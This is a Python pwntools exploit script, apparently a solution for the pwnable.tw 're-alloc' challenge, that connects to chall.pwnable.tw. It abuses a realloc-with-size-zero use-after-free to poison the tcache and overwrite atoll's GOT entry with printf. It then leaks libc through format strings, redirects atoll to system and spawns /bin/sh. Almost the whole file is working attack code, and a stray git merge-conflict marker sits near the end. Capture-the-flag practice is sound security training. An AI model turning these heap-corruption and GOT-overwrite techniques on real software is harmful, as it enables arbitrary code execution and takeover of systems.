from pwn import *
debug = 0
if debug:
	s = process('./re-alloc')
	raw_input('debug')
	__read_chk_offset = 0x109650
	system_offset = 0x46ff0
	binsh_offset = 0x183cee
else:
	s = remote('chall.pwnable.tw', 10106)
	e = ELF('libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so')
	__read_chk_offset = e.symbols['__read_chk']
	system_offset = e.symbols['system']
	binsh_offset = e.search('/bin/sh').next()

def alloc(index,size,data):
#0x00000000040133C
	s.sendlineafter("Your choice: ",'1')
	s.sendlineafter('Index:',str(index))
	s.sendlineafter('Size:',str(size))
	s.sendlineafter('Data:',data)

def realloc(index,size,data):
#0x00000000040149A
	s.sendlineafter("Your choice: ",'2')
	s.sendlineafter('Index:',str(index))
	s.sendlineafter('Size:',str(size))
	if(size != 0):
		s.sendlineafter('Data:',data)
	else:
		log.info('error with size = 0')
	
def rfree(index):
#0x00000000004015DD
	s.sendlineafter("Your choice: ",'3')
	s.sendlineafter('Index:',str(index))

def exit():
	s.sendlineafter("Your choice: ",'3')

'''
vuln: when we realloc, the function don't check the size if it = 0 , so if we realloc with size= 0, the chunk be freed
but its pointer still exists
'''
puts_got = 0x404028
puts_plt = 0x401050
printf_plt = 0x401070
read_check_plt = 0x401040
read_check_got = 0x404020
realloc_got = 0x404058
scanf_got = 0x404068
start = 0x0000000004010E0
heap = 0x4040b0
atoll_findLibc = 0x401096
atoll_got = 0x404048
realloc_findLibc = 0x4010b6 # 1
setvbuf_findLibc = 0x4010c6 # 3
scanf_findLibc =  0x4010d6 # 4
 
alloc(0,0x78,'lethanhtuan')
realloc(0,0x0,'realloc') # freed chunk index = 0 but the in the flow, it's still being use
realloc(0,0x58,p64(atoll_got))  #overwrite the fd pointer of freed chunk 0  = atoll_got
alloc(1,0x78,'abc') 
rfree(0)
# payload =  p64(printf_plt)*2+p64(realloc_findLibc) + p64(setvbuf_findLibc) + p64(scanf_findLibc)
# payload = payload.ljust(0x68,'\x00')
# payload += p64(heap-0x78)
# payload = payload.ljust(0x78,'\x00')
alloc(0,0x78,p64(printf_plt)) #overwrite the atoll func = printf_func

# leak libc by format string 
s.sendlineafter("Your choice: ",'1')
s.sendlineafter('Index:','%3$p')  #leak read_chk 
__read_chk_ = int(s.recvuntil('\n'),16)-9
log.info('__read_chk_: 0x%x'%__read_chk_)

s.sendlineafter("Your choice: ",'1')
s.sendlineafter('Index:','%12$p') # leak ebp
ebp = int(s.recvuntil('\n'),16)
log.info('ebp : 0x%x'%ebp)

base = __read_chk_ - __read_chk_offset
system = base + system_offset
binsh = base + binsh_offset
log.info('base: 0x%x'%base)
log.info('system: 0x%x' % system)
log.info('binsh: 0x%x' % binsh)

#call system

# clear the heap = format string 
s.sendlineafter("Your choice: ",'1')
s.sendlineafter('Index:','%9$nbbbb'+p64(heap))

s.sendlineafter("Your choice: ",'1')
s.sendlineafter('Index:','%9$nbbbb'+p64(heap+8))

'''
declare new function because the atoll becomes printf, so we can use the attribute of printf to make it look like atoll'''
def newalloc(index,size,data):
#0x00000000040133C
	s.sendlineafter("Your choice: ",'1')
	if index == 0:
		s.sendlineafter('Index:','\x00')
	else:
		s.sendlineafter('Index:','a\x00')
	s.sendlineafter('Size:','%'+str(size-1)+'x')
	s.sendlineafter('Data:',data)

def newrealloc(index,size,data):
#0x00000000040149A
	s.sendlineafter("Your choice: ",'2')
	if index == 0:
		s.sendlineafter('Index:','\x00')
	else:
		s.sendlineafter('Index:','a')
	if size != 0:
		s.sendlineafter('Size:','%'+str(size-1)+'x')
	else:
		s.sendlineafter('Size:','\x00')
	if(size != 0):
		s.sendlineafter('Data:',data)
	else:
		log.info('error with size = 0')
	
def newrfree(index):
#0x00000000004015DD
	s.sendlineafter("Your choice: ",'3')
	if index == 0:
		s.sendlineafter('Index:','\x00')
	else:
		s.sendlineafter('Index:','a')



newalloc(0,0x48,'lethanhtuan')
newrealloc(0,0x0,'realloc') # freed chunk index = 0 but the in the flow, it's still being use
newrealloc(0,0x28,p64(atoll_got))  #overwrite the fd pointer of freed chunk 0  = atoll_got
'''
now 
0x48 chunk -> atoll got
'''
newalloc(1,0x48,'abc') # malloc once 0x48 bytes chunk 
newrfree(0) # free index 0
newalloc(0,0x48,p64(system)) # malloc again to get the atoll_got fake chunk then overwrite the atoll func = system
s.sendlineafter("Your choice: ",'1')  # call alloc 
s.sendlineafter('Index:','/bin/sh\x00') # atoll = system , system('bin/sh')

s.interactive()
>>>>>>> dc6982a9060f3e893ac0ce5478671230dda6c9a7
s.close()
